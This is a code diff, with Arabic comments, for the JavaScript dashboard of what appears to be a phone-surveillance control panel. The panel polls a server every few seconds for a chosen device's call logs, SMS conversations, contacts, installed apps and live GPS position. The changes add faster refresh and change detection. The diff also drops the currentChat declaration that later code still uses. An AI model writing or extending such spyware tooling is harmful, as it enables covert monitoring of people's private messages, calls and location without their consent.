@@ -5,10 +5,10 @@ if (sessionStorage.getItem('logged_in') !== 'true') {
 
 let currentDevice = null;
 let updateInterval = null;
+let dataInterval = null;
 let allCalls = [];
 let allSMS = [];
 let allContacts = [];
-let currentChat = null;
 
 function logout() {
     sessionStorage.removeItem('logged_in');
@@ -58,9 +58,21 @@ async function loadDevices() {
 
 function selectDevice(deviceId) {
     currentDevice = deviceId;
+    
     if (updateInterval) clearInterval(updateInterval);
+    if (dataInterval) clearInterval(dataInterval);
+    
     if (deviceId) {
+        // تحديث الحالة كل 3 ثوانٍ
         updateInterval = setInterval(updateLiveData, 3000);
+        
+        // تحديث البيانات الكاملة كل 5 ثوانٍ
+        dataInterval = setInterval(() => {
+            if (currentDevice) {
+                loadAllData();
+            }
+        }, 5000);
+        
         updateLiveData();
         loadAllData();
     }
@@ -121,7 +133,6 @@ async function loadAllData() {
     await loadCalls();
     await loadSMS();
     await loadContacts();
-    await loadImages();
     await loadApps();
     await loadDeviceInfo();
 }
@@ -130,8 +141,13 @@ async function loadAllData() {
 async function loadCalls() {
     try {
         const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=call_logs`);
-        allCalls = await response.json();
-        displayCalls(allCalls);
+        const newCalls = await response.json();
+        
+        // تحقق إذا تغيرت البيانات
+        if (JSON.stringify(newCalls) !== JSON.stringify(allCalls)) {
+            allCalls = newCalls;
+            displayCalls(allCalls);
+        }
     } catch (e) {}
 }
 
@@ -166,12 +182,20 @@ function filterCalls() {
     displayCalls(filtered);
 }
 
-// ============ الرسائل (محادثات) ============
+// ============ الرسائل ============
 async function loadSMS() {
     try {
         const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=sms`);
-        allSMS = await response.json();
-        displayConversations();
+        const newSMS = await response.json();
+        
+        if (JSON.stringify(newSMS) !== JSON.stringify(allSMS)) {
+            allSMS = newSMS;
+            if (currentChat) {
+                openChat(currentChat);
+            } else {
+                displayConversations();
+            }
+        }
     } catch (e) {}
 }
 
@@ -188,7 +212,6 @@ function displayConversations() {
         return;
     }
     
-    // تجميع المحادثات حسب الرقم
     const conversations = {};
     allSMS.forEach(sms => {
         const number = sms.address || 'غير معروف';
@@ -198,7 +221,6 @@ function displayConversations() {
         conversations[number].push(sms);
     });
     
-    // عرض المحادثات
     Object.keys(conversations).forEach(number => {
         const messages = conversations[number];
         const lastMessage = messages[messages.length - 1];
@@ -245,6 +267,7 @@ function openChat(number) {
 }
 
 function backToConversations() {
+    currentChat = null;
     displayConversations();
 }
 
@@ -252,8 +275,12 @@ function backToConversations() {
 async function loadContacts() {
     try {
         const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=contacts`);
-        allContacts = await response.json();
-        displayContacts(allContacts);
+        const newContacts = await response.json();
+        
+        if (JSON.stringify(newContacts) !== JSON.stringify(allContacts)) {
+            allContacts = newContacts;
+            displayContacts(allContacts);
+        }
     } catch (e) {}
 }
 
@@ -389,10 +416,10 @@ function showLocationDetails(location) {
     const div = document.getElementById('locationDetails');
     if (location && location.latitude) {
         div.innerHTML = `
-            <p>خط العرض: ${location.latitude.toFixed(6)}</p>
-            <p>خط الطول: ${location.longitude.toFixed(6)}</p>
-            <p>الدقة: ${location.accuracy ? location.accuracy + ' متر' : '—'}</p>
-            <p>السرعة: ${location.speed ? location.speed + ' م/ث' : '—'}</p>
+            <p>📍 خط العرض: ${location.latitude.toFixed(6)}</p>
+            <p>📍 خط الطول: ${location.longitude.toFixed(6)}</p>
+            <p>📏 الدقة: ${location.accuracy ? location.accuracy + ' متر' : '—'}</p>
+            <p>🚗 السرعة: ${location.speed ? location.speed + ' م/ث' : '—'}</p>
         `;
     }
 }
